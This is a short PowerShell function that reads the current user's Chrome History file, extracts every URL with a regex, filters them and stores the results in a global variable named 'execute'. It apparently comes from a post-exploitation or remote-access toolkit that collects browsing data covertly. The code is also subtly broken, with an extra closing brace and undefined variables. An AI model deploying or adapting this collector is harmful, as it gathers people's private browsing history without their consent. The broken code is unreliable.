Function chrome{
    $Path = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History"
    $Out = ''
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[!] Could not find Chrome History for username: $UserName"
    }
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $Value = Get-Content -Path $path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            $Out += "$env:UserName Chrome History $_"
            }
        }
    } 
    $global:execute=$Out
}
